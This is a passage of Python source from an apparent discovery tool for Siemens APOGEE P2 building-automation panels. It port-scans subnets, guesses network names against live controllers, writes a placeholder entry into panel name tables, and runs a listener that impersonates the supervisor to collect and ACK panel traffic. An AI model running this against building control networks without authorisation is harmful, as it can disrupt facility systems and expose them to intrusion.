        anyway so no write happens, but no value either)
      * Multiple scanner identities (Cartesian dictionary attack) —
        every probe uses the same placeholder, so writes are idempotent
      * Fallback to anything that would write DIFFERENT names
    """
    from ipaddress import ip_network
    if node_candidates is None:
        node_candidates = [f'node{i}' for i in range(1, 21)]

    if verbose:
        print(f"\n{'═' * 70}")
        print(f"  COLD-DISCOVER (MINIMAL) — 2-packet primitive")
        print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  network={network}  bln={bln!r}")
        print(f"  scanner identity (slot 4) = {WILDCARD_15CHAR_PLACEHOLDER!r}")
        print(f"  node candidates: {len(node_candidates)} "
              f"({node_candidates[0]}..{node_candidates[-1]})")
        print(f"{'═' * 70}")

    # Phase A — Port scan TCP/5033
    try:
        net = ip_network(network, strict=False)
        scan_ips = sorted(
            (str(ip) for ip in (net.hosts() if net.prefixlen <= 30 else net)),
            key=lambda s: tuple(int(o) for o in s.split('.'))
        )
    except ValueError as e:
        if verbose:
            print(f"  ERROR: invalid network {network!r}: {e}")
        return None

    if verbose:
        print(f"\n  Phase A: port scan {len(scan_ips)} IPs on TCP/{P2_PORT}")
    pxcs = port_scan_p2(scan_ips, timeout=port_scan_timeout)
    if not pxcs:
        if verbose:
            print(f"  No hosts with TCP/{P2_PORT} open.")
        return None
    if verbose:
        print(f"  Found {len(pxcs)} PXC(s) on TCP/{P2_PORT}: {', '.join(pxcs)}")

    # Cooperative cancel: if the caller passed a threading.Event-like
    # object (anything with `is_set()`), poll it between phases and at
    # every per-host iteration. The GUI's Cancel button sets this; the
    # function returns whatever results have been collected so far.
    def _cancelled() -> bool:
        try:
            return stop_event is not None and stop_event.is_set()
        except Exception:
            return False

    if _cancelled():
        if verbose:
            print(f"  Cancelled after port scan.")
        return None

    # Phase A.5 — BLN auto-discovery (only when caller didn't supply one).
    #
    # On a switched BAS network the laptop can't see unicast supervisor↔
    # panel TCP traffic, so passive TCP/5033 sniff is unreliable. But
    # BACnet/IP UDP broadcasts ARE visible to every host on the subnet,
    # and the Desigo CC supervisor's BACnet device-object name typically
    # encodes the site prefix (e.g. 'ACMEBAS-Server'). So:
    #
    #   1. If site_hint not provided: 15 s passive BACnet recon →
    #      infer prefix(es) from device names (pure-passive, no writes)
    #   2. Generate BLN candidates from prefix(es)
    #   3. Active BLN-guess attack against first PXC with the placeholder
    #      identity in slot 4: wrong-BLN frames TCP-RST (no writes),
    #      correct BLN gets accepted/silent-dropped (1 placeholder
    #      write under WILDCARD_15CHAR_PLACEHOLDER)
    #
    # Worst case for the full chain: 1 NODE NAME TABLE entry on a single
    # panel under the placeholder, replicates BLN-wide as 1 entry total.
    if not bln:
        # Step 1: if no site_hint, try BACnet recon first
        inferred_prefixes: List[str] = []
        if not site_hint:
            if verbose:
                print(f"\n  Phase A.4: passive BACnet recon (15 s) — no "
                      f"site hint provided, listening for supervisor "
                      f"device-name broadcasts to infer prefix")
            inferred_prefixes = auto_detect_site_prefixes(
                duration=15, verbose=verbose)
            if inferred_prefixes:
                site_hint = inferred_prefixes[0]
                if verbose:
                    print(f"  Using inferred prefix as site_hint: "
                          f"{site_hint!r}")
                    if len(inferred_prefixes) > 1:
                        print(f"  (Other candidates if first fails: "
                              f"{inferred_prefixes[1:]})")

        if _cancelled():
            if verbose:
                print(f"  Cancelled after BACnet recon.")
            return None

        # Step 2: build candidate list (uses site_hint if we have one,
        # else generic patterns)
        bln_candidates = _default_bln_candidate_list(site_hint)
        # If multiple prefixes were inferred, generate candidates from
        # each and append. First-prefix candidates already at the front.
        if not site_hint or len(inferred_prefixes) > 1:
            for extra in inferred_prefixes[1:]:
                extra_candidates = _default_bln_candidate_list(extra)
                for c in extra_candidates:
                    if c not in bln_candidates:
                        bln_candidates.append(c)

        if verbose:
            print(f"\n  Phase A.5: active BLN auto-discovery against "
                  f"{pxcs[0]} (wrong-BLN guesses TCP-RST without writes)")
            print(f"    Trying {len(bln_candidates)} candidates...")
        bln = _discover_bln_via_probe(
            pxcs[0], bln_candidates,
            node_candidate='node1',
            delay=probe_delay,
            stop_event=stop_event,
            verbose=verbose,
        )
        if not bln:
            if verbose:
                print(f"\n  No BLN candidate accepted. Options:")
                print(f"    1. Provide bln='<YOUR-BLN>' explicitly")
                print(f"    2. Provide site_hint='<PREFIX>' (e.g. 'ACME' → "
                      f"tries ACMEEBLN, ACMEBLN, ACME_BLN, etc.)")
                print(f"    3. Look up BLN in Desigo CC > System Browser >")
                print(f"       Field Networks")
            return None
        if verbose:
            print(f"\n  BLN auto-discovered: {bln!r}")

    if _cancelled():
        if verbose:
            print(f"  Cancelled after BLN discovery.")
        return None

    # Phase B — Per-PXC 2-packet primitive (Identify handshake + 0x0050
    # chain). cold_discover_v0_14() iterates bln_candidates × node_
    # candidates until one accepts. We pass [single_node] at a time so
    # we can honour cancel between candidates (otherwise a per-host
    # call could run the full 20-candidate list before returning).
    if verbose:
        print(f"\n  Phase B: Identify handshake + 0x0050 chain per PXC "
              f"(2-packet primitive — single placeholder, idempotent writes)")

    discoveries: Dict[str, Dict[str, Any]] = {}
    supervisor_name: Optional[str] = None
    for host in pxcs:
        if _cancelled():
            if verbose:
                print(f"\n  Cancelled before probing {host}.")
            break
        if verbose:
            print(f"\n    {host}:")
        d = None
        for node in node_candidates:
            if _cancelled():
                if verbose:
                    print(f"      Cancelled mid-host {host}.")
                break
            r = cold_discover_v0_14(
                host=host,
                bln_candidates=[bln],
                node_candidates=[node],
                delay=probe_delay,
                verbose=False,  # quiet inner loop; we print per-host above
                chain_status_query=True,
            )
            if r:
                d = r
                if verbose:
                    print(f"      HIT node={node!r} "
                          f"bln={r.get('bln')!r} "
                          f"panel={r.get('panel_name')!r}")
                break
        if d:
            discoveries[host] = d
            if supervisor_name is None and d.get('supervisor_name_with_port'):
                supervisor_name = d['supervisor_name_with_port']
        elif verbose and not _cancelled():
            print(f"      no candidate accepted "
                  f"(tried {len(node_candidates)} node names)")

    if not discoveries:
        if verbose:
            print(f"\n  No panels responded to the Identify handshake. "
                  f"Verify the BLN name ({bln!r}) is correct — wrong BLN "
                  f"causes every panel to TCP-RST without responding.")
        return None

    # Phase C — Synthesize site_config from per-panel discoveries.
    # All panels on the same BLN return the same BLN + supervisor; use
    # the first one as canonical.
    first = discoveries[next(iter(discoveries))]
    canonical_bln = first.get('bln', bln)
    canonical_site = first.get('site') or re.sub(
        r'(_?E?BLN|NET)$', '', canonical_bln) or canonical_bln
    canonical_sup = (supervisor_name
                     or first.get('supervisor_name_with_port')
                     or first.get('supervisor_name')
                     or _GENERIC_SCANNER_NAME)

    site_config: Dict[str, Any] = {
        'p2_network': canonical_bln,
        'p2_site': canonical_site,
        'scanner_name': canonical_sup,
        'known_nodes': {},
    }
    for ip, d in discoveries.items():
        panel_name = d.get('panel_name')
        if panel_name:
            site_config['known_nodes'][panel_name] = ip

    if verbose:
        print(f"\n{'═' * 70}")
        print(f"  COLD-DISCOVER COMPLETE")
        print(f"{'═' * 70}")
        print(f"  BLN:              {canonical_bln}")
        print(f"  Site (guessed):   {canonical_site}")
        print(f"  Supervisor name:  {canonical_sup}")
        print(f"  Panels resolved:  {len(site_config['known_nodes'])}/"
              f"{len(pxcs)}")
        print()
        print(f"  Cleanup (one entry to remove BLN-wide):")
        print(f"    telnet into any panel, then:")
        print(f"      Fieldpanels dElete {WILDCARD_15CHAR_PLACEHOLDER}")
        print(f"      nodeNametable Remove {WILDCARD_15CHAR_PLACEHOLDER}")
        print(f"    (Fieldpanels dElete FIRST, then nodeNametable Remove —")
        print(f"     reverse order strands the field-panel entry)")
    return site_config


def polished_cold_discover(network: Optional[str] = None,
                           bln: Optional[str] = None,
                           node_candidates: Optional[List[str]] = None,
                           site_hint: Optional[str] = None,
                           save_to: Optional[str] = None,
                           bacnet_duration: int = 15,  # unused — kept for API stability
                           skip_bacnet: bool = False,   # unused — kept for API stability
                           probe_delay: float = 0.5,
                           backfill_unknown_names: bool = True,
                           probe_telnet: bool = True,
                           telnet_timeout: float = 1.0,
                           scanner_identity: Optional[str] = None,  # unused; placeholder is used
                           stop_event: Optional[Any] = None,
                           verbose: bool = True) -> Optional[Dict]:
    """One-shot cold discovery — no arguments needed for the common case.

    Auto-detects the local subnet, port-scans it for PXCs on TCP/5033,
    sends ONE 0x0050 StatusQuery per discovered PXC with a single
    consistent scanner identity (the minimum-write primitive), then
    probes each discovered panel's telnet availability and optionally
    writes the result to site.json.

    Per-panel NODE NAME TABLE footprint: ONE entry under the
    `scanner_identity` label, mapped to this machine's IP. Because
    every probe uses the same name and the same source IP, the
    panels' BLN-wide replication mechanism collapses these into a
    single BLN-wide entry. Cleanup is one `nodeNametable Remove
    <scanner_identity>` on any panel — propagates BLN-wide within
    ~2 minutes.

    Returns the discovered site_config dict on success, None on failure.
    The dict has the standard site.json shape:
        {
            'p2_network':  '<BLN>',
            'p2_site':     '<SITE>',
            'scanner_name':'<SUPERVISOR>|5033',
            'known_nodes': {'NODE1': '192.0.2.1', ...},
            'node_telnet': {'NODE1': True, ...},
        }

    Args:
        network: CIDR to scan (e.g. '192.168.1.0/24'). None = auto-detect
            the primary local /24.
        save_to: Path to write site.json on success (atomic, preserves
            arbitrary extra keys). None = dry-run, just return the dict.
        bacnet_duration: IGNORED. Kept for API stability. The polished
            flow does not run BACnet recon — it's not needed for the
            minimum-write primitive and adds ~15 s wall-clock.
        skip_bacnet: IGNORED. Kept for API stability.
        probe_delay: Inter-probe delay during the 0x0050 phase.
        backfill_unknown_names: IGNORED. Kept for API stability.
            cold_discover_minimal only records panels that resolved
            cleanly, so there are no UNKNOWN_* placeholders to backfill.
        probe_telnet: If True, probe TCP/23 on each discovered panel
            and record reachability in the returned dict's 'node_telnet'
            key (mapping node_name -> bool). Default True.
        telnet_timeout: Per-host telnet TCP-connect timeout (seconds).
        scanner_identity: The slot-4 value used for every 0x0050 probe.
            Default 'P2SCAN-LAP|5033' — clean, identifiable label so the
            NODE NAME TABLE cleanup-target is obvious.
        verbose: Print progress to stdout.

    What this function does NOT do (intentionally):
      * BACnet recon
      * Wrong-BLN Siemens fingerprint probe
      * Cartesian dictionary attack of (BLN, scanner, node) candidates
      * Anything that would dump multiple distinct names into the
        panels' NODE NAME TABLEs

    If the 0x0050 bootstrap returns zero hits, the function returns
    None and prints a hint about supplying a BLN sniff or running
    `cold_discover_site()` directly (which has the dictionary fallback)
    if the user genuinely wants it.

    Example:
        >>> result = polished_cold_discover(save_to='site.json')
        >>> result['p2_network']
        'MYSITEBLN'
        >>> result['known_nodes']
        {'NODE1': '192.0.2.1', 'NODE2': '192.0.2.2', ...}
        >>> result['node_telnet']
        {'NODE1': True, 'NODE2': False}
    """
    # Auto-detect network if caller didn't pin one down.
    if network is None:
        subnets = auto_detect_local_subnets()
        if not subnets:
            if verbose:
                print("  ERROR: could not auto-detect a local subnet.")
                print("         Provide network='X.X.X.X/24' explicitly.")
            return None
        network = subnets[0]
        if verbose:
            print(f"  Auto-detected local network: {network}")
            if len(subnets) > 1:
                print(f"  (Additional candidates not scanned: "
                      f"{', '.join(subnets[1:])})")

    # If BLN not provided, cold_discover_minimal will auto-discover via
    # active BLN-guess attack against the first port-scanned PXC (Phase
    # A.5 — wrong-BLN candidates TCP-RST without writing, only the
    # correct one accepts and writes 1 placeholder entry). This works
    # without a SPAN port. If you DO have a SPAN port, you can call
    # passive_sniff_bln() first and pass the result as `bln=` here to
    # skip the active probe phase entirely.

    # Strict minimum-write path: per-PXC IdentifyBlock handshake (with
    # the configured BLN + small node-name candidate list) chained to
    # 0x0050 StatusQuery for the supervisor name. cold_discover_minimal
    # uses a single placeholder scanner identity across all probes so
    # silent-drop writes are idempotent — total NODE NAME TABLE
    # footprint is ONE BLN-wide entry under WILDCARD_15CHAR_PLACEHOLDER.
    site_config = cold_discover_minimal(
        network=network,
        bln=bln,
        node_candidates=node_candidates,
        site_hint=site_hint,
        probe_delay=probe_delay,
        stop_event=stop_event,
        verbose=verbose,
    )
    if not site_config:
        return None
    # `backfill_unknown_names` is now a no-op — cold_discover_minimal
    # only records panels that the IdentifyBlock handshake actually
    # resolved, so there are no UNKNOWN_* placeholders to backfill.
    # Argument `scanner_identity` is also unused — the 15-character
    # placeholder is always used (matches the wildcard accept length).
    # Both kept in the signature for API stability.
    _ = backfill_unknown_names
    _ = scanner_identity

    # Phase 5 — Telnet-availability probe.
    # Same indicator Insight/Desigo CC's "Field Network" view surfaces:
    # a green dot means the panel's telnet service is accepting
    # connections (operator can run `Fieldpanels dElete` / `nodeNametable
    # Remove` from there), a gray/red dot means it isn't. Recorded into
    # site.json as 'node_telnet': {node_name: bool} so the GUI can render
    # the status without re-probing on every reload.
    if probe_telnet:
        nodes_for_probe = site_config.get('known_nodes', {})
        if nodes_for_probe:
            if verbose:
                print(f"\n  PHASE 5: Telnet (TCP/23) availability probe "
                      f"({len(nodes_for_probe)} panel(s))")
            telnet_status: Dict[str, bool] = {}
            for name, ip in sorted(nodes_for_probe.items()):
                if verbose:
                    print(f"    {name:<14} {ip:<16}", end=" ",
                          flush=True)
                r = probe_telnet_status(ip, timeout=telnet_timeout,
                                        read_banner=False)
                telnet_status[name] = bool(r['open'])
                if verbose:
                    print("OPEN" if r['open']
                          else f"closed ({r['error']})")
            site_config['node_telnet'] = telnet_status
            if verbose:
                open_count = sum(1 for v in telnet_status.values() if v)
                print(f"    Telnet open on {open_count}/"
                      f"{len(telnet_status)} panel(s)")

    # Optional: persist to site.json.
    if save_to:
        ok = _atomic_write_site_json(save_to, site_config)
        if verbose:
            if ok:
                print(f"\n  Saved site config to {save_to}")
            else:
                print(f"\n  WARNING: could not write {save_to} "
                      f"(returning discovery anyway)")

    return site_config


# ═══════════════════════════════════════════════════════════════════════════════
# Passive push-channel listener (default TCP 5033, configurable) + related parsers
# ═══════════════════════════════════════════════════════════════════════════════
#
# A P2 ALN is a full-mesh of TCP/5033 by default. PXCs also open an outbound
# TCP session to the supervisor port at boot (default 5033 per Siemens 149-1006;
# some sites run that listener on a non-5033 port — e.g. a Datamate Advanced
# co-install bumps it off 5033 — so the port is configurable) and push
# asynchronous notifications there:
#   0x0274 — COV notification (value changed on a TEC-device point)
#   0x0240 — BLN-sourced virtual-point value report (device name is literally "NONE")
#   0x4634 — BLN routing-table announcement
# Supervisor's only job on the push channel is to ACK with a 39-byte routing-header reply.
# Running this listener alongside a real DCC server will work, but expect the
# real DCC to retry to panels that get confused by duplicate ACKs — use only on
# a dedicated IP or during a maintenance window for passive reconnaissance.

def _parse_routing_header(payload: bytes) -> Optional[Tuple[bytes, List[str], bytes]]:
    """Split P2 routing header off the payload.

    Returns ``(direction_byte, [name1, name2, name3, name4], remaining_body)``
    or None on parse failure. The four names are:
        [BLN, destination, BLN, source]  for DATA/HEARTBEAT messages
        [BLN, sender, BLN, recipient]    for CONNECT/ANNOUNCE (order reversed)
    Caller needs to know the message type to interpret which slot is which.
    """
    if not payload:
        return None
    dir_byte = payload[0:1]
    names = []
    i = 1
    for _ in range(4):
        j = payload.find(b'\x00', i)
        if j < 0:
            return None
        try:
            names.append(payload[i:j].decode('ascii'))
        except UnicodeDecodeError:
            return None
        i = j + 1
    return dir_byte, names, payload[i:]


def _extract_tlv_strings(data: bytes) -> List[str]:
    """Pull out TLV strings (tag=0x01, u16 BE length, ASCII value)."""
    out = []
    i = 0
    while i + 3 <= len(data):
        if data[i] == 0x01:
            L = struct.unpack('>H', data[i + 1:i + 3])[0]
            if 0 < L < 1024 and i + 3 + L <= len(data):
                val = data[i + 3:i + 3 + L]
                if all(32 <= b < 127 for b in val):
                    try:
                        out.append(val.decode('ascii'))
                        i += 3 + L
                        continue
                    except UnicodeDecodeError:
                        pass
        i += 1
    return out


_COV_COND_FIELDS = ('point_priority', 'control_status', 'out_of_service', 'failed',
                    'proof_on', 'operator_disabled', 'program_disabled',
                    'commanded_to_alarm', 'alarm_state', 'alarm_priority')


def _read_tlv(body: bytes, off: int):
    """Read a string TLV `01 00 <len> <bytes>` at off. Returns (text, next_off) or
    (None, off) if there is no TLV there."""
    if off + 3 > len(body) or body[off] != 0x01 or body[off + 1] != 0x00:
        return None, off
    ln = body[off + 2]
    if off + 3 + ln > len(body):
        return None, off
    return body[off + 3:off + 3 + ln].decode('latin-1', 'replace'), off + 3 + ln


def _consume_scope_tag(body: bytes, off: int) -> int:
    """Skip an optional scope tag `01 00 <len> <SCOPE> <priority:1> <3F FF FF FF>`."""
    s_, no = _read_tlv(body, off)
    if s_ in ('SYST', 'NONE', 'CC') and no + 5 <= len(body) \
            and body[no + 1:no + 5] == b'\x3f\xff\xff\xff':
        return no + 5
    return off


def _decode_event_timestamp(body: bytes, off: int):
    """Decode an 8-byte event timestamp [yr-1900][mo][day][DOW 1=Mon][hr][min][sec][cs].
    Returns (iso_string, next_off) or (None, off) if the 8 bytes are not a plausible
    timestamp (year>=2000 guard rejects the null/sentinel and most non-timestamp bytes)."""
    if off + 8 > len(body):
        return None, off
    yr, mo, dy, dw, hh, mm, ss, cs = body[off:off + 8]
    if not (100 <= yr <= 199 and 1 <= mo <= 12 and 1 <= dy <= 31 and 1 <= dw <= 7
            and hh <= 23 and mm <= 59 and ss <= 59 and cs <= 99):
        return None, off
    dow = ('Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun')[dw - 1]
    return (f"{1900 + yr:04d}-{mo:02d}-{dy:02d} {dow} "
            f"{hh:02d}:{mm:02d}:{ss:02d}.{cs:02d}"), off + 8


def parse_cov_notification(body: bytes) -> Optional[Dict[str, Any]]:
    """Parse a 0x0274 COV_ANNUNCIATE body (payload INCLUDING the 2-byte opcode).

    Wire layout (matches the p2.lua dissector): `02 74` + `count` (u16), then per point:
        name_space (u16, observed 00 00)
        name TLV   (01 00 LL <name>)
        suffix TLV (01 00 LL <suffix>, empty for top-level points)
        value      (f32 BE)
        condition  (10 bytes: point_priority, control_status, out_of_service, failed,
                    proof_on, operator_disabled, program_disabled, commanded_to_alarm,
                    alarm_state, alarm_priority)

    Returns {device, point, value, direction='cov', condition, points}. `points` is the
    full list of decoded points; device/point/value reflect the first point for
    backward-compatible display.
    """
    if len(body) < 6 or body[0:2] != b'\x02\x74':
        return None
    count = struct.unpack('>H', body[2:4])[0]
    off = 4
    points: List[Dict[str, Any]] = []
    for _ in range(min(count, 256)):           # cap guards against a bogus count
        if off + 2 > len(body):
            break
        ns = struct.unpack('>H', body[off:off + 2])[0]
        off += 2
        name, off = _read_tlv(body, off)
        if name is None:
            break
        suffix, no = _read_tlv(body, off)
        if suffix is None:
            suffix = ''
        else:
            off = no
        value = None
        if off + 4 <= len(body):
            try:
                value = struct.unpack('>f', body[off:off + 4])[0]
            except struct.error:
                pass
            off += 4
        cond: Dict[str, int] = {}
        if off + 10 <= len(body):
            for i, fn in enumerate(_COV_COND_FIELDS):
                cond[fn] = body[off + i]
            off += 10
        points.append({'name': name, 'suffix': suffix, 'value': value,
                       'name_space': ns, 'condition': cond})
    if not points:
        return None
    p0 = points[0]
    return {'device': p0['name'], 'point': p0['suffix'] or p0['name'],
            'value': p0['value'], 'direction': 'cov',
            'condition': p0['condition'], 'points': points}


def parse_alarm_report(body: bytes) -> Optional[Dict[str, Any]]:
    """Parse a 0x0508 ALARM_PRINT push body (payload INCLUDING the 2-byte opcode).

    Best-effort, matching the dissector's alarm decode: an optional scope tag, then the
    point and descriptor name TLVs, a value block (`3F FF FF Fx` quality sentinel +
    sub-type + f32), and up to three 8-byte event timestamps (event / reference /
    last-normal). Returns {point, descriptor, value, timestamps, direction='alarm'}.
    """
    if len(body) < 4 or body[0:2] != b'\x05\x08':
        return None
    off = _consume_scope_tag(body, 2)
    n = len(body)
    names: List[str] = []
    value = None
    timestamps: List[str] = []
    while off < n:
        b0 = body[off]
        tlv, no = _read_tlv(body, off)
        if tlv is not None:
            if tlv and tlv not in ('SYST', 'NONE', 'CC'):
                names.append(tlv)
            off = no
            continue
        if value is None and off + 11 <= n and b0 == 0x3F \
                and body[off + 1] == 0xFF and body[off + 2] == 0xFF:
            off += 7                            # quality sentinel (4) + group (3)
            try:
                value = struct.unpack('>f', body[off:off + 4])[0]
            except struct.error:
                pass
            off += 4
            continue
        if len(timestamps) < 3:
            ts, no = _decode_event_timestamp(body, off)
            if ts is not None:
                timestamps.append(ts)
                off = no
                continue
        off += 1
    return {'point': names[0] if names else None,
            'descriptor': names[-1] if len(names) > 1 else None,
            'value': value, 'timestamps': timestamps, 'direction': 'alarm'}


def parse_write_with_quality(body: bytes) -> Optional[Dict[str, Any]]:
    """Parse a 0x0240 WriteWithQuality body.

    APOGEE_P2_SPEC.md §12.6 documents two distinct wire shapes selected
    by the scope byte at offset +7 (the separator after the scope-tag
    TLV). The scanner only generates reads, so this is parse-only for
    observed traffic.

    NONE-scope form (PXC -> supervisor on push channel — BLN-virtual report):
        02 40
        01 00 04 "NONE"
        00                          separator (0x00 = NONE scope)
        3F FF FF FF                 wildcard / quality-default sentinel
        00 00
        01 00 LL <point>
        01 00 00 00 00 01 00 00 01 00 00   marker pattern
        XX XX XX XX                 f32 BE value
        00                          trailer

    SYST-scope form (supervisor -> PXC on 5033 — fails with 0x0E15;
    supervisor retries via 0x4222 BulkPropertyWrite):
        02 40
        01 00 04 "SYST"
        23                          separator (0x23 = SYST scope)
        ... addressing fields ...
        ... value bytes ...
        00                          quality byte

    Returns {'device', 'point', 'value', 'scope'} where scope is 'NONE'
    or 'SYST'. SYST-form value extraction is best-effort because the
    addressing-field layout varies by request flavor.
    """
    if len(body) < 20 or body[0:2] != b'\x02\x40':
        return None
    strings = _extract_tlv_strings(body)
    if len(strings) < 2:
        return None
    device, point = strings[0], strings[1]

    # Disambiguate by the scope-separator byte at body[9]: 0x00 = NONE,
    # 0x23 = SYST. Offset 9 = 2-byte opcode + 3-byte TLV header + 4-byte
    # scope-string value ("NONE"/"SYST").
    scope = 'NONE'
    if len(body) >= 10 and body[9] == 0x23:
        scope = 'SYST'

    # Float-search heuristic — same as before. For NONE the f32 sits
    # in the well-defined post-marker slot; for SYST the layout is
    # less stable across firmware revs and the heuristic catches it.
    value = None
    for i in range(len(body) - 5, max(0, len(body) - 20), -1):
        try:
            v = struct.unpack('>f', body[i:i + 4])[0]
            if -1e9 < v < 1e9 and v == v:
                if abs(v) > 1e-6:
                    value = v
                    break
        except struct.error:
            continue
    if value is None:
        for i in range(max(0, len(body) - 20), len(body) - 3):
            try:
                v = struct.unpack('>f', body[i:i + 4])[0]
                if v == 0.0:
                    value = v
                    break
            except struct.error:
                continue
    return {'device': device, 'point': point, 'value': value, 'scope': scope}


def parse_routing_table(body: bytes) -> Optional[Dict[str, Any]]:
    """Parse a 0x4634 BLN routing-table push.

    Wire format:
        46 34 00 00 00 00 <u16 count?> 00 0E   ~10-byte header
        (01 00 LL <name> 00 00 <u32 BE cost>)+
        00 00 00 00                     terminator

    Per APOGEE_P2_SPEC.md §12.10, the first TLV MUST be `$paneldefault`
    (cost always 12) — it's the internal fallback/default-route anchor.
    A body whose first TLV is not `$paneldefault` is malformed and
    parsers SHOULD reject it rather than continue. Returns None on
    malformed input; {'entries': [...]} on success.
    """
    if len(body) < 10 or body[0:2] != b'\x46\x34':
        return None
    entries = []
    i = 10  # skip 10-byte header; exact structure varies slightly by firmware
    while i + 5 < len(body):
        if body[i] == 0x01:
            L = struct.unpack('>H', body[i + 1:i + 3])[0]
            if 0 < L < 64 and i + 3 + L + 4 <= len(body):
                name_bytes = body[i + 3:i + 3 + L]
                try:
                    name = name_bytes.decode('ascii')
                except UnicodeDecodeError:
                    i += 1
                    continue
                cost = struct.unpack('>I', body[i + 3 + L:i + 3 + L + 4])[0]
                # First-TLV invariant — must be $paneldefault per spec §12.10.
                # Reject malformed frames rather than parse them as topology.
                if not entries and name != '$paneldefault':
                    return None
                entries.append({'name': name, 'cost': cost})
                i += 3 + L + 4
                continue
        i += 1
    # An empty entry list means we never found a TLV at the expected
    # 10-byte offset — also malformed.
    if not entries:
        return None
    return {'entries': entries}


def _build_ack_response(msg_type: int, seq: int, req_payload: bytes,
                       supervisor_name: str, site_name: str) -> bytes:
    """Build a 39-byte routing-header-only ACK (direction byte 0x01).

    The ACK echoes the request's seq and swaps the destination/source names.
    """
    rh = _parse_routing_header(req_payload)
    if rh is None:
        return b''
    _, names, _ = rh
    # Slot 0=BLN, slot 1=dest(=us), slot 2=BLN, slot 3=src(=panel)
    # For response: slot 1 becomes the panel (was src), slot 3 becomes us (was dest)
    bln = names[0]
    panel = names[3]
    us = names[1]
    body = (
        b'\x01' +
        bln.encode('ascii') + b'\x00' +
        panel.encode('ascii') + b'\x00' +
        bln.encode('ascii') + b'\x00' +
        us.encode('ascii') + b'\x00'
    )
    return struct.pack('>III', 12 + len(body), msg_type, seq) + body


def listen_for_push_notifications(port: int = 5033, duration: Optional[int] = None,
                                  output_format: str = 'table',
                                  output_file: Optional[str] = None,
                                  ack_enabled: bool = True,
                                  verbose: bool = False,
                                  bind_address: str = '0.0.0.0') -> None:  # noqa: S104 - explicit back-compat default, warned at runtime, overridable via --listen-bind
    """Bind to TCP port (default 5033 — Siemens-canonical supervisor port
    per white paper 149-1006) and passively collect PXC push notifications.

    Decodes:
      - 0x0274 COV notifications → device/point/value events
      - 0x0240 WriteWithQuality  → BLN virtual updates (device="NONE")
      - 0x4634 Routing tables    → BLN topology dumps

    Sends routing-header-only ACKs back to keep panels happy. Handles multiple
    concurrent inbound connections via threading.

    Args:
        port: TCP port to bind (default 5033 — Siemens-canonical supervisor port per white paper 149-1006; override if your site uses a different port, e.g. 5034 when Datamate Advanced occupies 5033).
        duration: Seconds to listen; None runs until KeyboardInterrupt.
        output_format: 'table' (human) or 'json' (one object per line, JSONL).
        output_file: Path to write events; stdout if None.
        ack_enabled: If False, don't ACK — useful if a real DCC is also listening
                     and you want to avoid confusing panels. Panels may drop the
                     connection after ~30s without ACKs.
        verbose: Print connection/disconnection events.
    """
    import threading
    import json as _json
    from concurrent.futures import ThreadPoolExecutor

    # Cap concurrent peer connections so a misconfigured supervisor or a
    # flood from a hostile peer can't spawn unbounded threads. 32 is well
    # above any realistic site (a typical BLN has 5–20 panels feeding the
    # supervisor on the configured supervisor port); excess connections queue in the executor and
    # are handled as workers free up.
    MAX_PEER_THREADS = 32

    out_lock = threading.Lock()
    out_stream = open(output_file, 'a', buffering=1) if output_file else None
    # In-flight connection counter, guarded by its own lock. A single-element
    # list so the nested handler can mutate it without a `nonlocal`.
    _inflight = [0]
    _inflight_lock = threading.Lock()

    def emit(event: Dict):
        line = (_json.dumps(event) if output_format == 'json'
                else _format_event_line(event))
        with out_lock:
            if out_stream:
                out_stream.write(line + '\n')
            else:
                print(line)

    def handle_connection(csock: socket.socket, peer: Tuple[str, int]):
        if verbose:
            print(f"  [{port}] connection from {peer[0]}:{peer[1]}")
        buf = b''
        try:
            csock.settimeout(45)  # heartbeat interval is ~30s; give 45s before we give up
            while True:
                chunk = csock.recv(8192)
                if not chunk:
                    break
                buf += chunk
                # Parse as many complete P2 messages as we have
                while len(buf) >= 12:
                    total_len, msg_type, seq = struct.unpack('>III', buf[:12])
                    if total_len < 12 or total_len > 65536:
                        # Framing desync — discard and move on
                        buf = b''
                        break
                    if len(buf) < total_len:
                        break   # wait for more bytes
                    raw_payload = buf[12:total_len]
                    buf = buf[total_len:]

                    event = {
                        'peer': f'{peer[0]}:{peer[1]}',
                        'msg_type': f'0x{msg_type:02X}',
                        'seq': seq,
                    }

                    rh = _parse_routing_header(raw_payload)
                    if rh:
                        dir_byte, names, body = rh
                        event['src_node'] = names[3] if len(names) > 3 else '?'
                        event['bln'] = names[0] if names else '?'

                        if msg_type in (P2Message.TYPE_DATA, P2Message.TYPE_HEARTBEAT) and body:
                            # The 2-byte opcode is meaningful ONLY in dir==0x00 frames
                            # (requests / panel pushes). In a 0x01 success response the
                            # post-routing bytes are payload, and in a 0x05 error they are
                            # a 2-byte status code — reading an "opcode" off either would
                            # fabricate opcodes. (Verified against raw captures.)
                            if dir_byte == 0x00:
                                op_bytes = body[:2]
                                op = struct.unpack('>H', op_bytes)[0] if len(op_bytes) == 2 else None
                                event['opcode'] = f'0x{op:04X}' if op is not None else '?'
                                if op is not None:
                                    nm = p2_data.opcode_name(op)
                                    if nm:
                                        event['opcode_name'] = nm
                                    fam = p2_data.opcode_operand(op)
                                    if fam:
                                        event['operand'] = "%s=%s" % (fam[1], fam[2])
                                if op_bytes == P2Message.MARKER_VALUE_PUSH:
                                    parsed = parse_cov_notification(body)
                                    if parsed:
                                        event['event'] = 'cov'
                                        event.update(parsed)
                                elif op_bytes == P2Message.MARKER_WRITE_QUAL:
                                    parsed = parse_write_with_quality(body)
                                    if parsed:
                                        event['event'] = 'virtual_push'
                                        event.update(parsed)
                                elif op_bytes == P2Message.MARKER_ROUTING_TBL:
                                    parsed = parse_routing_table(body)
                                    if parsed:
                                        event['event'] = 'routing_table'
                                        event['peer_count'] = len(parsed.get('entries', []))
                                        event['entries'] = parsed['entries']
                                elif op_bytes == P2Message.MARKER_ALARM_REPORT:
                                    parsed = parse_alarm_report(body)
                                    if parsed:
                                        event['event'] = 'alarm'
                                        event.update(parsed)
                                else:
                                    event['event'] = 'unknown_opcode'
                            elif dir_byte == 0x05:
                                # Panel error response — 2-byte status code, not an opcode.
                                err = struct.unpack('>H', body[:2])[0] if len(body) >= 2 else None
                                event['event'] = 'error_response'
                                if err is not None:
                                    event['error'] = _P2_STATUS_ERRORS.get(err, f'0x{err:04X}')
                            else:
                                # dir_byte == 0x01 — success response; payload, no opcode.
                                event['event'] = 'response'
                        elif msg_type in (P2Message.TYPE_CONNECT, P2Message.TYPE_ANNOUNCE):
